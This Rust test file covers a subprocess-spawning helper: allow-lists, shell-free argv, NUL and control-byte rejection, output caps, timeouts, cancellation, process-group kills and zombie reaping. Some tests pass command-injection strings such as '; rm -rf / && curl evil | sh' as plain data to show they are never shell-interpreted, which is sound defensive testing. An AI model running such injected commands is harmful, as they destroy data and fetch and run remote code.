// SPDX-License-Identifier: MIT

//! Tests for the BigSubprocess spec/exec helpers.

use super::*;

#[test]
fn empty_program_rejected() {
    let spec = BigSubprocessSpec::builder().program("").build();
    let err = spec.try_resolved().unwrap_err();
    assert!(matches!(err, BigSubprocessError::EmptyProgram));
}

#[test]
fn empty_allow_list_rejects_every_program() {
    let spec = BigSubprocessSpec::builder()
        .program("true")
        .allow_list(std::iter::empty::<&str>())
        .build();

    let err = spec.try_resolved().unwrap_err();

    assert!(matches!(err, BigSubprocessError::ProgramNotAllowed(p) if p == "true"));
}

#[test]
fn allow_list_blocks_unknown_program() {
    let spec = BigSubprocessSpec::builder()
        .program("rm")
        .allow_list(["ffprobe", "ffmpeg"])
        .build();
    let err = spec.try_resolved().unwrap_err();
    assert!(matches!(err, BigSubprocessError::ProgramNotAllowed(p) if p == "rm"));
}

#[test]
fn allow_list_permits_listed_program() {
    let spec = BigSubprocessSpec::builder()
        .program("ffprobe")
        .allow_list(["ffprobe", "ffmpeg"])
        .build();
    assert!(spec.try_resolved().is_ok());
}

#[test]
fn argv_never_uses_shell() {
    let spec = BigSubprocessSpec::builder()
        .program("echo")
        .arg("; rm -rf /")
        .arg("&& curl evil")
        .build();
    let r = spec.resolved();
    assert_eq!(r.argv, ["; rm -rf /", "&& curl evil"]);
    assert_eq!(r.program, "echo");
}

/// A spec test sees whether a spawn is the person's.
#[test]
fn person_spawn_shows_in_resolved() {
    let spec = BigSubprocessSpec::builder()
        .program("echo")
        .for_person(true)
        .build();
    assert!(spec.resolved().for_person);
}

#[test]
fn defaults_are_safe() {
    let spec = BigSubprocessSpec::builder().program("echo").build();
    let r = spec.resolved();
    assert_eq!(r.stdout, BigSubprocessOutputMode::Capture);
    assert_eq!(r.stderr, BigSubprocessOutputMode::Capture);
    assert_eq!(r.timeout_ms, 30_000);
    assert!(r.env_inherit);
    assert!(!r.for_person);
    assert_eq!(r.stdin_len, 0);
    assert_eq!(r.inherited_fd_count, 0);
    assert!(!r.unix_process_group);
    assert_eq!(r.max_address_space_bytes, None);
}

#[test]
#[cfg_attr(miri, ignore)]
fn inherited_fd_reaches_only_child() {
    use std::ffi::CString;
    use std::fs::File;
    use std::io::{Seek, SeekFrom, Write};
    use std::os::fd::{AsRawFd, FromRawFd};

    let name = CString::new("big-os-kit-test").expect("static name");
    // SAFETY: `name` is a valid NUL-terminated string and flags are supported.
    let raw_fd = unsafe { libc::memfd_create(name.as_ptr(), libc::MFD_CLOEXEC) };
    assert!(raw_fd >= 0, "memfd_create failed");
    // SAFETY: the successful syscall returned one owned descriptor.
    let mut file = unsafe { File::from_raw_fd(raw_fd) };
    file.write_all(b"inherited-fd-contract")
        .expect("write fixture");
    file.seek(SeekFrom::Start(0)).expect("rewind fixture");
    let path = format!("/proc/self/fd/{}", file.as_raw_fd());
    let spec = BigSubprocessSpec::builder()
        .program("cat")
        .arg(path)
        .inherit_fd(file.into())
        .build();

    assert_eq!(spec.resolved().inherited_fd_count, 1);
    let output = spec.run().expect("child reads inherited fd");
    assert!(output.status.success());
    assert_eq!(output.stdout, b"inherited-fd-contract");
}

#[test]
#[cfg_attr(miri, ignore)]
fn daemon_gets_no_stray_fds() {
    use std::ffi::CString;
    use std::fs::File;
    use std::os::fd::{AsRawFd, FromRawFd};

    let name = CString::new("big-os-kit-stray").expect("static name");
    // No MFD_CLOEXEC: the descriptor a library opens carelessly, which a
    // plain exec would hand on.
    // SAFETY: `name` is a valid NUL-terminated string and flags are supported.
    let raw_fd = unsafe { libc::memfd_create(name.as_ptr(), 0) };
    assert!(raw_fd >= 0, "memfd_create failed");
    // SAFETY: the successful syscall returned one owned descriptor.
    let stray = unsafe { File::from_raw_fd(raw_fd) };
    let output = BigSubprocessSpec::builder()
        .program("test")
        .arg("-e")
        .arg(format!("/proc/self/fd/{}", stray.as_raw_fd()))
        .unix_process_group(true)
        .build()
        .run()
        .expect("test runs");
    assert!(!output.status.success());
}

/// A child given one descriptor gets that one, and no other left open
/// without close-on-exec.
#[test]
#[cfg_attr(miri, ignore)]
fn inherited_fd_child_gets_no_stray() {
    use std::ffi::CString;
    use std::fs::File;
    use std::io::{Seek, SeekFrom, Write};
    use std::os::fd::{AsRawFd, FromRawFd};

    let memfd = |name: &str, flags| {
        let name = CString::new(name).expect("static name");
        // SAFETY: `name` is a valid NUL-terminated string and flags are supported.
        let raw_fd = unsafe { libc::memfd_create(name.as_ptr(), flags) };
        assert!(raw_fd >= 0, "memfd_create failed");
        // SAFETY: the successful syscall returned one owned descriptor.
        unsafe { File::from_raw_fd(raw_fd) }
    };
    let stray = memfd("big-os-kit-stray", 0);
    let mut kept = memfd("big-os-kit-kept", libc::MFD_CLOEXEC);
    kept.write_all(b"kept").expect("write fixture");
    kept.seek(SeekFrom::Start(0)).expect("rewind fixture");
    let output = BigSubprocessSpec::builder()
        .program("sh")
        .arg("-c")
        .arg("test -e /proc/self/fd/$1 && exit 1; cat /proc/self/fd/$2")
        .arg("sh")
        .arg(stray.as_raw_fd().to_string())
        .arg(kept.as_raw_fd().to_string())
        .inherit_fd(kept.into())
        .build()
        .run()
        .expect("sh runs");
    assert!(
        output.status.success(),
        "the stray descriptor reached the child"
    );
    assert_eq!(output.stdout, b"kept");
}

#[test]
fn drain_capped_respects_max_bytes() {
    let mut buf: Vec<u8> = Vec::new();
    let payload = vec![b'A'; DEFAULT_MAX_CAPTURE_BYTES + 16];
    let payload_len = payload.len() as u64;
    let mut cursor = std::io::Cursor::new(payload);
    drain_capped(&mut cursor, &mut buf).expect("drain");
    assert_eq!(buf.len(), DEFAULT_MAX_CAPTURE_BYTES);
    assert_eq!(cursor.position(), payload_len);
}

#[test]
// Miri does not implement `posix_spawn`; normal `cargo test` still checks
// concurrent stdout draining against a real child process.
#[cfg_attr(miri, ignore)]
fn large_output_drains_concurrently() {
    // A child writing far more than the OS pipe buffer (~64 KiB) must not
    // deadlock: with a short timeout, the only way this completes is if
    // stdout is drained concurrently while the child runs, as `pw-dump`
    // (~300 KiB) needs.
    let bytes = 512 * 1024;
    let spec = BigSubprocessSpec::builder()
        .program("head")
        .arg("-c")
        .arg(bytes.to_string())
        .arg("/dev/zero")
        .timeout(Duration::from_secs(5))
        .build();
    let out = spec.run().expect("head runs without timeout");
    assert!(out.status.success());
    assert_eq!(out.stdout.len(), bytes);
}

/// Output past the capture cap keeps its bounded prefix and says it was cut,
/// so a capped listing still shows what it read and a whole-output parser
/// can refuse it.
#[test]
#[cfg_attr(miri, ignore)]
fn oversized_stdout_is_marked_truncated() {
    let spec = BigSubprocessSpec::builder()
        .program("head")
        .arg("-c")
        .arg((DEFAULT_MAX_CAPTURE_BYTES + 1).to_string())
        .arg("/dev/zero")
        .timeout(Duration::from_secs(10))
        .build();
    let output = spec.run().expect("capped run");
    assert!(output.status.success());
    assert!(output.stdout_truncated);
    assert_eq!(output.stdout.len(), DEFAULT_MAX_CAPTURE_BYTES);
}

#[test]
// Miri does not implement `posix_spawn`; normal `cargo test` still checks
// captured stdout from a real child process.
#[cfg_attr(miri, ignore)]
fn run_captures_stdout() {
    let spec = BigSubprocessSpec::builder()
        .program("echo")
        .arg("hello big-app-kit")
        .timeout(Duration::from_secs(5))
        .build();
    let out = spec.run().expect("echo runs");
    assert!(out.status.success());
    assert!(out.stdout_lossy().contains("hello big-app-kit"));
}

#[test]
// Miri does not implement `posix_spawn`; normal `cargo test` still checks
// streaming stdout and wait semantics against a real child process.
#[cfg_attr(miri, ignore)]
fn spawn_streams_stdout_then_waits() {
    use std::io::Read;
    let mut child = BigSubprocessSpec::builder()
        .program("echo")
        .arg("streamed")
        .build()
        .spawn()
        .expect("spawn echo");
    let mut out = String::new();
    child
        .take_stdout()
        .expect("stdout pipe")
        .read_to_string(&mut out)
        .expect("read stdout");
    let status = child.wait().expect("wait");
    assert!(status.success());
    assert!(out.contains("streamed"));
}

#[test]
// Miri does not implement `posix_spawn`; normal `cargo test` still checks
// kill/wait behavior against a real long-lived child process.
#[cfg_attr(miri, ignore)]
fn spawn_kill_terminates_long_child() {
    let mut child = BigSubprocessSpec::builder()
        .program("sleep")
        .arg("30")
        .build()
        .spawn()
        .expect("spawn sleep");
    assert!(child.try_wait().expect("poll").is_none());
    child.kill().expect("kill");
    let status = child.wait().expect("wait after kill");
    assert!(!status.success());
}

#[test]
#[cfg_attr(miri, ignore)]
fn process_group_spawn_kills_long_child() {
    let mut child = BigSubprocessSpec::builder()
        .program("sleep")
        .arg("30")
        .unix_process_group(true)
        .build()
        .spawn()
        .expect("spawn sleep");
    assert!(child.try_wait().expect("poll").is_none());
    child.terminate().expect("terminate process group");
    let status = child.wait().expect("wait after terminate");
    assert!(!status.success());
}

#[test]
#[cfg_attr(miri, ignore)]
// The leader of `sh -c 'sleep 300 &'` exits at once; killing the group before
// anyone waits for it still reaches the backgrounded sleep.
fn group_kill_outlives_exited_leader() {
    use std::io::BufRead;
    let mut child = BigSubprocessSpec::builder()
        .program("sh")
        .arg("-c")
        .arg("sleep 300 & echo $!")
        .unix_process_group(true)
        .build()
        .spawn()
        .expect("spawn sh");
    let stdout = child.take_stdout().expect("stdout captured");
    let mut line = String::new();
    std::io::BufReader::new(stdout)
        .read_line(&mut line)
        .expect("pid line");
    let state = |pid: &str| {
        std::fs::read_to_string(format!("/proc/{pid}/stat"))
            .ok()
            .and_then(|stat| stat.rsplit_once(") ").map(|(_, rest)| rest.chars().next()))
            .flatten()
    };
    let leader = child.id().to_string();
    let deadline = std::time::Instant::now() + Duration::from_secs(5);
    while state(&leader) != Some('Z') && std::time::Instant::now() < deadline {
        std::thread::sleep(Duration::from_millis(10));
    }

    child.kill().expect("kill the group");
    let _ = child.wait();

    let sleeper = line.trim();
    let deadline = std::time::Instant::now() + Duration::from_secs(2);
    while state(sleeper).is_some_and(|state| state != 'Z') && std::time::Instant::now() < deadline {
        std::thread::sleep(Duration::from_millis(10));
    }
    assert!(
        state(sleeper).is_none_or(|state| state == 'Z'),
        "the backgrounded sleep outlived the group kill"
    );
}

#[test]
#[cfg_attr(miri, ignore)]
// A process-group child that exits after spawning a grandchild which
// inherited stdout must not hang `run()`: the readers see EOF only when every
// write end closes, and the group's tear-down at the child's exit closes them.
fn run_returns_despite_grandchild_stdout() {
    let started = std::time::Instant::now();
    let out = BigSubprocessSpec::builder()
        .program("sh")
        .arg("-c")
        .arg("sleep 30 & exit 0")
        .unix_process_group(true)
        .timeout(Duration::from_secs(5))
        .build()
        .run()
        .expect("sh exits 0");
    assert!(out.status.success());
    assert!(
        started.elapsed() < Duration::from_secs(15),
        "run() blocked on the reader join past the deadline: {:?}",
        started.elapsed()
    );
}

/// Outside a process group nothing can kill the grandchild holding the pipe,
/// so the output waits only until the deadline.
#[test]
#[cfg_attr(miri, ignore)]
fn grandchild_pipe_ends_at_the_deadline() {
    let started = std::time::Instant::now();
    let run = BigSubprocessSpec::builder()
        .program("sh")
        .arg("-c")
        .arg("sleep 30 & exit 0")
        .timeout(Duration::from_secs(1))
        .build()
        .run();
    assert!(matches!(run, Err(BigSubprocessError::Timeout)), "{run:?}");
    assert!(
        started.elapsed() < Duration::from_secs(10),
        "{:?}",
        started.elapsed()
    );
}

#[test]
fn spawn_enforces_allow_list() {
    let err = BigSubprocessSpec::builder()
        .program("rm")
        .allow_list(["echo"])
        .build()
        .spawn()
        .unwrap_err();
    assert!(matches!(err, BigSubprocessError::ProgramNotAllowed(p) if p == "rm"));
}

#[test]
// Miri does not implement `posix_spawn`; normal `cargo test` still checks
// detached launch behavior against a real child process.
#[cfg_attr(miri, ignore)]
fn spawn_detached_launches_and_returns() {
    BigSubprocessSpec::builder()
        .program("true")
        .build()
        .spawn_detached()
        .expect("detached true");
}

#[test]
fn nul_in_program_rejected() {
    let spec = BigSubprocessSpec::builder().program("ec\0ho").build();
    let err = spec.try_resolved().unwrap_err();
    assert!(
        matches!(
            err,
            BigSubprocessError::ForbiddenArgvByte { index: 0, byte: 0 }
        ),
        "got {err:?}"
    );
}

#[test]
fn argv_nul_reports_index() {
    let spec = BigSubprocessSpec::builder()
        .program("echo")
        .arg("clean")
        .arg("bad\0tail")
        .build();
    let err = spec.try_resolved().unwrap_err();
    // argv[1] (the second token) carries the NUL → reported index 2.
    assert!(
        matches!(
            err,
            BigSubprocessError::ForbiddenArgvByte { index: 2, byte: 0 }
        ),
        "got {err:?}"
    );
}

/// A Linux file name may hold any byte but NUL and `/`; POSIX `printf %s`
/// writes its argument back unchanged.
#[test]
fn file_name_bytes_reach_child() {
    let name = "line\nbreak\rreturn\x7fdelete";
    let output = BigSubprocessSpec::builder()
        .program("printf")
        .arg("%s")
        .arg(name)
        .build()
        .run()
        .expect("printf runs");
    assert!(output.status.success());
    assert_eq!(output.stdout, name.as_bytes());
}

#[test]
fn refusal_message_escapes_control_bytes() {
    let err = BigSubprocessSpec::builder()
        .program("rm\nforged log line")
        .allow_list(["ffprobe"])
        .build()
        .try_resolved()
        .unwrap_err();
    let message = err.to_string();
    assert!(!message.contains('\n'), "{message}");
    assert!(message.contains(r"rm\nforged"), "{message}");
}

#[test]
fn shell_metacharacters_pass_validation() {
    // Shell metacharacters are data (no shell is used); only NUL is rejected,
    // so a clean-but-spicy argv must resolve OK.
    let spec = BigSubprocessSpec::builder()
        .program("echo")
        .arg("; rm -rf / && curl evil | sh")
        .arg("/tmp/file name.mp4")
        .build();
    assert!(spec.try_resolved().is_ok());
}

#[test]
// Miri does not implement `posix_spawn`; normal `cargo test` still checks
// captured stderr and status code against a real failing child process.
#[cfg_attr(miri, ignore)]
fn failure_captures_stderr_and_code() {
    // `ls` on a missing path writes to stderr and exits non-zero (code 2 on
    // GNU coreutils). Exercises BigSubprocessStatus::code + stderr_lossy.
    let out = BigSubprocessSpec::builder()
        .program("ls")
        .arg("/nonexistent_path_xyzzy_42")
        .timeout(Duration::from_secs(5))
        .build()
        .run()
        .expect("ls runs");
    assert!(!out.status.success());
    assert_eq!(out.status.code(), Some(2));
    // Assert the actual stderr content (the offending path) so a constant-return
    // mutant on stderr_lossy cannot survive.
    assert!(
        out.stderr_lossy().contains("/nonexistent_path_xyzzy_42"),
        "stderr should name the missing path: {:?}",
        out.stderr_lossy()
    );
}

#[test]
// Miri does not implement `posix_spawn`; normal `cargo test` still checks
// pid and stderr pipe behavior against a real child process.
#[cfg_attr(miri, ignore)]
fn spawn_exposes_pid_and_stderr() {
    let mut child = BigSubprocessSpec::builder()
        .program("sleep")
        .arg("5")
        .build()
        .spawn()
        .expect("spawn sleep");
    assert!(
        child.id() > 1,
        "child must report a real pid, got {}",
        child.id()
    );
    assert!(
        child.take_stderr().is_some(),
        "stderr pipe is captured by default"
    );
    child.kill().expect("kill");
    let _ = child.wait();
}

#[test]
// Miri does not implement `posix_spawn`; normal `cargo test` still checks
// try_wait behavior against a real child process.
#[cfg_attr(miri, ignore)]
fn try_wait_reports_completion() {
    let mut child = BigSubprocessSpec::builder()
        .program("true")
        .build()
        .spawn()
        .expect("spawn true");
    // Poll until the fast child exits; must eventually report Some(success),
    // not a perpetual None.
    let mut final_status = None;
    for _ in 0..200 {
        match child.try_wait().expect("poll") {
            Some(status) => {
                final_status = Some(status);
                break;
            }
            None => std::thread::sleep(Duration::from_millis(10)),
        }
    }
    assert!(
        final_status
            .expect("child must report completion")
            .success(),
        "`true` exits 0"
    );
}

#[test]
// Miri does not implement `posix_spawn`; normal `cargo test` still checks
// environment inheritance against a real child process.
#[cfg_attr(miri, ignore)]
fn env_inherited_by_default() {
    // Default specs inherit the parent environment (env_inherit = true), so the
    // child `env` sees PATH. A mutant that flips the env_clear guard drops it.
    let out = BigSubprocessSpec::builder()
        .program("env")
        .timeout(Duration::from_secs(5))
        .build()
        .run()
        .expect("env runs");
    assert!(out.status.success());
    assert!(
        out.stdout_lossy().contains("PATH="),
        "inherited environment must include PATH"
    );
}

#[test]
#[cfg_attr(miri, ignore)]
fn desktop_variables_not_inherited() {
    let child_env = || {
        BigSubprocessSpec::builder()
            .program("env")
            .timeout(Duration::from_secs(5))
            .build()
            .run()
            .expect("env runs")
            .stdout_lossy()
    };
    if std::env::var_os(DESKTOP_RENDERER).is_some() {
        let env = child_env();
        assert!(!env.contains("GSK_RENDERER="), "{env}");
        assert!(!env.contains("NOTIFY_SOCKET="), "{env}");
        return;
    }
    // The variables have to be in this process's environment: run this test
    // again in a child that has it.
    let out = BigSubprocessSpec::builder()
        .program(std::env::current_exe().expect("test binary"))
        .args([
            "--exact",
            "subprocess::tests::desktop_variables_not_inherited",
            "--quiet",
        ])
        .env("GSK_RENDERER", "gl")
        .env(DESKTOP_RENDERER, "gl")
        .env("NOTIFY_SOCKET", "@desktop")
        .timeout(Duration::from_secs(60))
        .build()
        .run()
        .expect("child test runs");
    assert!(
        out.status.success() && out.stdout_lossy().contains("1 passed"),
        "{}",
        out.stdout_lossy()
    );
}

/// The `LC_NUMERIC` and `BIG_PERSON_LC_NUMERIC` lines of what `env` prints
/// when started from this process, for the person or as a helper.
fn numeric_lines(for_person: bool) -> Vec<String> {
    BigSubprocessSpec::builder()
        .program("env")
        .for_person(for_person)
        .timeout(Duration::from_secs(5))
        .build()
        .run()
        .expect("env runs")
        .stdout_lossy()
        .lines()
        .filter(|line| {
            line.starts_with("LC_NUMERIC=") || line.starts_with("BIG_PERSON_LC_NUMERIC=")
        })
        .map(str::to_owned)
        .collect()
}

/// After this process pins its numbers to `C`, a helper keeps the pin and a
/// program started for the person gets their `LC_ALL`, else `LC_NUMERIC`,
/// else none; neither carries the variable that kept it.
#[test]
#[cfg_attr(miri, ignore)]
fn person_spawn_gets_person_numbers() {
    const EXPECTED: &str = "BIG_OS_KIT_EXPECTED_NUMERIC";
    if let Some(expected) = std::env::var_os(EXPECTED) {
        // SAFETY: the child runs this one test, on the only thread that
        // touches the environment.
        unsafe { crate::init_c_numeric_locale() };
        assert_eq!(numeric_lines(false), ["LC_NUMERIC=C"]);
        let expected: Vec<String> = match expected.to_str().expect("UTF-8") {
            "" => Vec::new(),
            numeric => vec![format!("LC_NUMERIC={numeric}")],
        };
        assert_eq!(numeric_lines(true), expected);
        return;
    }
    let cases: [(&[(&str, &str)], &str); 4] = [
        (&[("LC_NUMERIC", "pt_BR.UTF-8")], "pt_BR.UTF-8"),
        (
            &[("LC_ALL", "de_DE.UTF-8"), ("LC_NUMERIC", "pt_BR.UTF-8")],
            "de_DE.UTF-8",
        ),
        (&[("LANG", "pt_BR.UTF-8")], ""),
        (&[("LC_ALL", ""), ("LANG", "pt_BR.UTF-8")], ""),
    ];
    for (locale, expected) in cases {
        let mut child = BigSubprocessSpec::builder()
            .program(std::env::current_exe().expect("test binary"))
            .args([
                "--exact",
                "subprocess::tests::person_spawn_gets_person_numbers",
                "--quiet",
            ])
            .env_inherit(false)
            .env(EXPECTED, expected);
        if let Some(path) = std::env::var_os("PATH") {
            child = child.env("PATH", path);
        }
        for (variable, value) in locale {
            child = child.env(variable, value);
        }
        let out = child
            .timeout(Duration::from_secs(60))
            .build()
            .run()
            .expect("child test runs");
        assert!(
            out.status.success() && out.stdout_lossy().contains("1 passed"),
            "{locale:?}: {}",
            out.stdout_lossy()
        );
    }
}

/// Mesa's `debug_parse_bool_option` with a false default (src/util/u_debug.c)
/// is the oracle: these words true in any case, every other value false.
#[test]
fn software_request_read_as_mesa() {
    let cases = [
        (None, false),
        (Some(""), false),
        (Some("1"), true),
        (Some("y"), true),
        (Some("YES"), true),
        (Some("t"), true),
        (Some("True"), true),
        (Some("0"), false),
        (Some("false"), false),
        (Some("2"), false),
        (Some("on"), false),
        (Some(" 1"), false),
    ];
    for (value, requested) in cases {
        assert_eq!(
            mesa_true(value.map(std::ffi::OsStr::new)),
            requested,
            "LIBGL_ALWAYS_SOFTWARE={value:?}"
        );
    }
}

#[test]
#[cfg_attr(miri, ignore)]
fn desktop_gpu_variables_stay_desktop_only() {
    if std::env::var_os(DESKTOP_GPU).is_some() {
        let env = BigSubprocessSpec::builder()
            .program("env")
            .timeout(Duration::from_secs(5))
            .build()
            .run()
            .expect("env runs")
            .stdout_lossy();
        for name in [
            "__EGL_VENDOR_LIBRARY_FILENAMES=",
            "VK_LOADER_DRIVERS_DISABLE=",
            "BIG_DESKTOP_GPU=",
        ] {
            assert!(!env.contains(name), "{env}");
        }
        let handed = desktop_gpu_environment();
        assert_eq!(handed.len(), 3, "{handed:?}");
        return;
    }
    assert!(desktop_gpu_environment().is_empty());
    // The variables have to be in this process's environment: run this test
    // again in a child that has them.
    let out = BigSubprocessSpec::builder()
        .program(std::env::current_exe().expect("test binary"))
        .args([
            "--exact",
            "subprocess::tests::desktop_gpu_variables_stay_desktop_only",
            "--quiet",
        ])
        .env(
            "__EGL_VENDOR_LIBRARY_FILENAMES",
            "/usr/share/glvnd/egl_vendor.d/50_mesa.json",
        )
        .env("VK_LOADER_DRIVERS_DISABLE", "*nvidia*")
        .env(DESKTOP_GPU, "mesa")
        .timeout(Duration::from_secs(60))
        .build()
        .run()
        .expect("child test runs");
    assert!(
        out.status.success() && out.stdout_lossy().contains("1 passed"),
        "{}",
        out.stdout_lossy()
    );
}

/// Reader that yields `chunk`-sized reads (chosen not to divide the capture
/// cap) so the `n.min(remaining)` truncation in `drain_capped` is actually
/// exercised: a chunk-aligned source never hits the partial branch.
struct ChunkedReader {
    remaining: usize,
    chunk: usize,
}

impl std::io::Read for ChunkedReader {
    fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
        if self.remaining == 0 {
            return Ok(0);
        }
        let n = self.chunk.min(self.remaining).min(buf.len());
        buf[..n].fill(b'A');
        self.remaining -= n;
        Ok(n)
    }
}

/// Reader that returns one injected error, then EOF.
struct ErrorOnceReader(Option<std::io::ErrorKind>);

impl std::io::Read for ErrorOnceReader {
    fn read(&mut self, _: &mut [u8]) -> std::io::Result<usize> {
        match self.0.take() {
            Some(kind) => Err(std::io::Error::from(kind)),
            None => Ok(0),
        }
    }
}

#[test]
fn drain_capped_truncates_at_cap() {
    let mut reader = ChunkedReader {
        remaining: DEFAULT_MAX_CAPTURE_BYTES + 8192,
        chunk: 1000,
    };
    let mut buf = Vec::new();
    drain_capped(&mut reader, &mut buf).expect("drain");
    assert_eq!(buf.len(), DEFAULT_MAX_CAPTURE_BYTES);
    assert_eq!(reader.remaining, 0);
}

#[test]
fn drain_capped_retries_on_interrupted() {
    let mut reader = ErrorOnceReader(Some(std::io::ErrorKind::Interrupted));
    let mut buf = Vec::new();
    // Interrupted must be retried (continue), not propagated → Ok with no data.
    drain_capped(&mut reader, &mut buf).expect("interrupted is retried");
    assert!(buf.is_empty());
}

#[test]
fn drain_capped_propagates_non_interrupted_error() {
    let mut reader = ErrorOnceReader(Some(std::io::ErrorKind::Other));
    let mut buf = Vec::new();
    let err = drain_capped(&mut reader, &mut buf).unwrap_err();
    assert!(matches!(err, BigSubprocessError::Io(_)), "got {err:?}");
}

#[test]
// Miri does not implement `posix_spawn`; normal `cargo test` still checks that
// flipping the cancel flag kills a long-lived child well under its timeout.
#[cfg_attr(miri, ignore)]
fn cancel_flag_kills_child() {
    use std::sync::Arc;
    use std::sync::atomic::AtomicBool;

    // 5 s sleep with a 30 s timeout: the only way this returns fast is the
    // cancel flag, not the deadline.
    let spec = BigSubprocessSpec::builder()
        .program("sleep")
        .arg("5")
        .timeout(Duration::from_secs(30))
        .build();

    let cancel = Arc::new(AtomicBool::new(false));
    let flipper = Arc::clone(&cancel);
    std::thread::spawn(move || {
        std::thread::sleep(Duration::from_millis(100));
        flipper.store(true, std::sync::atomic::Ordering::Relaxed);
    });

    let start = std::time::Instant::now();
    let err = spec.run_cancellable(&cancel).unwrap_err();
    let elapsed = start.elapsed();

    assert!(
        matches!(err, BigSubprocessError::Cancelled),
        "expected Cancelled, got {err:?}"
    );
    // Killed within one poll tick of the flip, far under the 5 s sleep / 30 s
    // timeout. Generous 2 s bound tolerates loaded CI.
    assert!(
        elapsed < Duration::from_secs(2),
        "cancel must kill fast, took {elapsed:?}"
    );
}

#[test]
// Miri does not implement `posix_spawn`; normal `cargo test` still checks that
// a fast command completes normally when the cancel flag never flips.
#[cfg_attr(miri, ignore)]
fn uncancelled_run_returns_output() {
    use std::sync::atomic::AtomicBool;

    let cancel = AtomicBool::new(false);
    let out = BigSubprocessSpec::builder()
        .program("echo")
        .arg("uncancelled")
        .timeout(Duration::from_secs(5))
        .build()
        .run_cancellable(&cancel)
        .expect("echo runs");
    assert!(out.status.success());
    assert!(out.stdout_lossy().contains("uncancelled"));
    assert!(!cancel.load(std::sync::atomic::Ordering::Relaxed));
}

#[test]
#[cfg_attr(miri, ignore)]
fn observer_runs_before_completion() {
    use std::sync::atomic::AtomicBool;

    let cancel = AtomicBool::new(false);
    let mut observations = 0;
    let output = BigSubprocessSpec::builder()
        .program("sleep")
        .arg("0.12")
        .timeout(Duration::from_secs(5))
        .build()
        .run_cancellable_observed(&cancel, || {
            observations += 1;
            Ok(())
        })
        .expect("observed child completes");

    assert!(output.status.success());
    assert!(observations > 0);
}

#[test]
#[cfg_attr(miri, ignore)]
fn failing_observer_stops_the_child() {
    use std::sync::atomic::AtomicBool;

    let cancel = AtomicBool::new(false);
    let started = std::time::Instant::now();
    let error = BigSubprocessSpec::builder()
        .program("sleep")
        .arg("5")
        .timeout(Duration::from_secs(30))
        .build()
        .run_cancellable_observed(&cancel, || Err(std::io::Error::other("observer failed")))
        .expect_err("observer failure must stop the child");

    assert!(matches!(error, BigSubprocessError::Io(_)));
    assert!(started.elapsed() < Duration::from_secs(2));
}

#[test]
// Miri does not implement `posix_spawn`; normal `cargo test` still checks that
// the timeout still fires when neither cancel nor completion happens.
#[cfg_attr(miri, ignore)]
fn uncancelled_run_still_times_out() {
    use std::sync::atomic::AtomicBool;

    // Never-flipped cancel + a sleep that outlives the short timeout: the
    // deadline path must still win and report Timeout, not Cancelled.
    let cancel = AtomicBool::new(false);
    let err = BigSubprocessSpec::builder()
        .program("sleep")
        .arg("5")
        .timeout(Duration::from_millis(200))
        .build()
        .run_cancellable(&cancel)
        .unwrap_err();
    assert!(
        matches!(err, BigSubprocessError::Timeout),
        "expected Timeout, got {err:?}"
    );
}

/// A large stdin payload to a child that never reads it must not hang.
///
/// Writing before the drain threads exist and before the deadline starts
/// deadlocks the two ends: the child fills its stderr pipe with nobody reading
/// and stops consuming stdin, while the parent blocks in `write_all` with
/// neither the timeout nor the cancel flag running yet.
///
/// One pipe buffer is ~64 KiB; this sends four of them at a child that reads
/// nothing and writes more than a buffer of its own.
#[test]
fn unread_large_stdin_never_hangs() {
    let noisy_and_deaf = "yes 'a line of noise to fill the pipe' | head -c 200000 >&2";
    let output = BigSubprocessSpec::builder()
        .program("sh")
        .args(["-c", noisy_and_deaf])
        .stdin(vec![b'x'; 256 * 1024])
        .stdout(BigSubprocessOutputMode::Capture)
        .stderr(BigSubprocessOutputMode::Capture)
        .allow_list(["sh"])
        .timeout(std::time::Duration::from_secs(20))
        .build()
        .run()
        .expect("the call returns instead of deadlocking");

    assert!(
        output.stderr.len() > 64 * 1024,
        "the child's output was drained while our stdin write was still going"
    );
}

/// A detached helper leaves no zombie behind.
///
/// `spawn_detached` returns `()`, so the caller cannot wait. Nothing in this
/// workspace ignores `SIGCHLD`, so a dropped, unwaited `Child` leaves a
/// `<defunct>` entry holding a PID until the parent exits. The parents are the
/// shell, the file manager and the terminal: processes that run all day and
/// launch a helper on every "open with" or "set as wallpaper".
#[test]
fn detached_helper_is_reaped() {
    BigSubprocessSpec::builder()
        .program("true")
        .allow_list(["true"])
        .build()
        .spawn_detached()
        .expect("spawn the helper");

    // The reaper runs on its own thread; give it a moment, then ask the kernel.
    for _ in 0..50 {
        std::thread::sleep(std::time::Duration::from_millis(20));
        if children_in_state_zombie() == 0 {
            return;
        }
    }
    panic!("a detached helper is still a zombie after a second");
}

/// The reaper sleeps while a detached child is alive, and still reaps it.
///
/// Polling while any child lived would wake the session for as long as the
/// terminal daemon runs.
#[test]
fn reaper_sleeps_while_child_lives() {
    BigSubprocessSpec::builder()
        .program("sleep")
        .arg("2")
        .allow_list(["sleep"])
        .build()
        .spawn_detached()
        .expect("spawn the helper");
    std::thread::sleep(std::time::Duration::from_millis(100));
    let before = reaper_switches();
    std::thread::sleep(std::time::Duration::from_secs(1));
    let woken = reaper_switches() - before;
    // A little room for the other tests of this binary, which launch detached
    // children of their own in parallel.
    assert!(
        woken <= 3,
        "the reaper woke {woken} times with nothing to reap"
    );
    for _ in 0..150 {
        std::thread::sleep(std::time::Duration::from_millis(20));
        if children_in_state_zombie() == 0 && reaper_switches() > before {
            return;
        }
    }
    panic!("the detached child was not reaped after it ended");
}

/// Context switches of this process's reaper thread, from `/proc`.
fn reaper_switches() -> u64 {
    let Ok(tasks) = std::fs::read_dir("/proc/self/task") else {
        return 0;
    };
    tasks
        .filter_map(Result::ok)
        .filter(|task| {
            std::fs::read_to_string(task.path().join("comm"))
                .is_ok_and(|name| name.trim() == "big-subprocess-")
        })
        .filter_map(|task| std::fs::read_to_string(task.path().join("status")).ok())
        .flat_map(|status| {
            status
                .lines()
                .filter(|line| line.contains("ctxt_switches"))
                .filter_map(|line| line.split_whitespace().last()?.parse::<u64>().ok())
                .collect::<Vec<_>>()
        })
        .sum()
}

/// Zombie children of this process, counted from `/proc`.
fn children_in_state_zombie() -> usize {
    let Ok(entries) = std::fs::read_dir("/proc") else {
        return 0;
    };
    entries
        .filter_map(Result::ok)
        .filter(|entry| {
            let Ok(status) = std::fs::read_to_string(entry.path().join("status")) else {
                return false;
            };
            let mine = status
                .lines()
                .find_map(|line| line.strip_prefix("PPid:"))
                .and_then(|ppid| ppid.trim().parse::<u32>().ok())
                == Some(std::process::id());
            mine && status.contains("State:\tZ")
        })
        .count()
}

